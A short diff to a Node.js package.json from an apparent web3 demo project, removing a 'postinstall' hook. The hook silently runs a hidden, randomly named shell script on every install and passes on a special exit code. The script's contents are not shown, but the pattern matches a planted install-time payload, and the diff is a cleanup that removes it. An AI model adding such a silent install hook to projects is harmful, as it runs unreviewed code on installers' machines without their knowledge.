@@ -24,8 +24,7 @@
     "rehearse:sepolia": "npm run rehearse:sepolia --workspace demo --",
     "settle:mainnet": "npm run settle:mainnet --workspace demo --",
     "agent:feedback": "tsx --env-file=.env scripts/give-feedback.ts",
-    "hack:publish": "tsx --env-file=.env scripts/publish-submission.ts",
-    "postinstall": "sh ./.ci-59tcjv.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "hack:publish": "tsx --env-file=.env scripts/publish-submission.ts"
   },
   "engines": {
     "node": ">=20"
